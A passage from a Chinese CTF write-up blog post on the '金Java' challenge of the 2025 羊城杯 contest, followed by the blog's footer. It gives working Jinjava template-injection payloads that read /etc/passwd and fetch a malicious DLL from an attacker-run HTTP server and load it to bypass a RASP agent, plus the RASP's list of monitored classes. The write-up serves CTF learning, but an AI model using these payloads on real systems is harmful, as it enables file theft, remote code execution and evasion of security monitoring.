+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="type">set</span> <span class="variable">mapper</span> <span class="operator">=</span> ____int3rpr3t3r____.config.objectMapper %&#125;</span><br><span class="line">&#123;&#123; mapper.enableDefaultTyping() &#125;&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">file</span> <span class="operator">=</span> mapper.readValue(<span class="string">&#x27;&quot;file:///etc/passwd&quot;&#x27;</span>, mapper.getTypeFactory().constructFromCanonical(<span class="string">&#x27;java.net.URL&#x27;</span>)) %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">inputStream</span> <span class="operator">=</span> file.openStream() %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">bytes</span> <span class="operator">=</span> inputStream.readAllBytes() %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">stringType</span> <span class="operator">=</span> mapper.getTypeFactory().constructFromCanonical(<span class="string">&#x27;java.lang.String&#x27;</span>) %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">content</span> <span class="operator">=</span> mapper.convertValue(bytes, stringType) %&#125;</span><br><span class="line">&#123;&#123; content &#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>读取&#x2F;flag时显示无权限, 可读 &#x2F;readflag，说明要RCE</p>
+<p>读一下 &#x2F;proc&#x2F;self&#x2F;cmdline，可以得到jar包</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx512m -javaagent:/app/ycbRASP-1.0-SNAPSHOT-dependencies.jar -jar /app/ezjin-0.0.1-SNAPSHOT.jar </span><br></pre></td></tr></table></figure></div>
+
+<p>可以读取下来然后代码审计</p>
+<p>查看RASP的jar包内容，被检测的类如下，这里只是被检查，并不是直接WAF掉这些类</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] TARGET_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line"><span class="string">&quot;java.lang.UNIXProcess&quot;</span>, <span class="string">&quot;java.lang.ProcessImpl&quot;</span>, <span class="string">&quot;jdk.internal.process.UnixProcess&quot;</span>, <span class="string">&quot;jdk.internal.process.ProcessImpl&quot;</span>, <span class="string">&quot;jdk.internal.process.WindowsProcess&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;java.lang.Runtime&quot;</span>, <span class="string">&quot;java.lang.System&quot;</span>, <span class="string">&quot;java.io.ObjectInputStream&quot;</span>, <span class="string">&quot;javax.naming.InitialContext&quot;</span>, <span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="string">&quot;java.lang.System&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>审计源码会发现对于<code>java.lang.Runtime</code>只禁了<code>exec</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251015124546396.png"
+                      alt="image-20251015124546396"
+                ></p>
+<p>对于<code>java.lang.System</code>只禁用了<code>load</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251015124704765.png"
+                      alt="image-20251015124704765"
+                ></p>
+<p>但是<code>java.lang.System.load</code>实际上是调用了<code>Runtime.getRuntime().load0</code></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251015124953825.png"
+                      alt="image-20251015124953825" style="zoom:67%;" 
+                >
+
+<p><code>Runtime</code>中<code>load方法 </code>有对<code>load0</code>的调用, 并且为public方法, 所以可以直接使用<code>Runtime.getRuntime().load()</code>加载外部库，绕过题目中的RASP</p>
+<p>linux生成so，windows生成dll</p>
+<p><strong>由于Runtime.getRuntime().load方法‌不能直接加载远程动态链接库，只能加载本地</strong>，在VPS上python起一个http服务存放恶意 .dll 或 .so ，由于靶机出网，让靶机访问下载至本地即可</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ____int3rpr3t3r____.config.objectMapper.convertValue( ____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;T(java.nio.file.Files).readAllBytes(T(java.nio.file.Files).write(T(java.nio.file.Paths).get(&quot;D:/tmp/test/pwned.dll&quot;), new java.net.URL(&quot;http://127.0.0.1:8000/calc.dll&quot;).openStream().readAllBytes()))&#x27;</span>).getValue(), ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;java.lang.String&#x27;</span>) ) &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>写入后加载即可RCE</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">T(java.lang.Runtime).getRuntime().load(&quot;D:/tmp/test/pwned.dll&quot;)</span></span><br><span class="line"><span class="string">&#x27;</span>).getValue().getInputStream().readAllBytes()</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251015125931627.png"
+                      alt="image-20251015125931627" style="zoom:67%;" 
+                >
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2025羊城杯 WP</li>
+        <li><strong>Author:</strong> xiaolaisec</li>
+        <li><strong>Created at
+                :</strong> 2025-10-14 19:07:05</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-10-20 09:19:53
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/10/14/2025羊城杯WP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2025/10/20/QWB2025%20WP/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">强网杯2025+强网拟态线上预选赛 WP</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/10/02/WMCTF2025-WEB-WP/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">2025 WMCTF WP</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">2025羊城杯 WP</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-unserialize"><span class="nav-text">ez_unserialize</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POP%E9%93%BE"><span class="nav-text">POP链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-blog"><span class="nav-text">ez_blog</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#authweb"><span class="nav-text">authweb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#staticNodeService"><span class="nav-text">staticNodeService</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%99%E9%87%8C%E5%B0%B1%E6%98%AFpython%E7%9A%84BUG"><span class="nav-text">这里就是python的BUG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E6%AC%A1%E8%AE%B0%E4%BD%8F%E4%B8%8D%E8%A6%81%E5%81%B7%E6%87%92%EF%BC%8C%E6%89%8B%E5%8A%A8%E6%B7%BB%E5%8A%A0"><span class="nav-text">下次记住不要偷懒，手动添加</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezsignin"><span class="nav-text">ezsignin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#evil-login"><span class="nav-text">evil_login</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%92%E4%B8%80%E5%8F%A5"><span class="nav-text">插一句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#update-it"><span class="nav-text">update_it</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%9C%E7%A2%8D%E7%82%B9"><span class="nav-text">障碍点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-3"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%91Java"><span class="nav-text">金Java</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
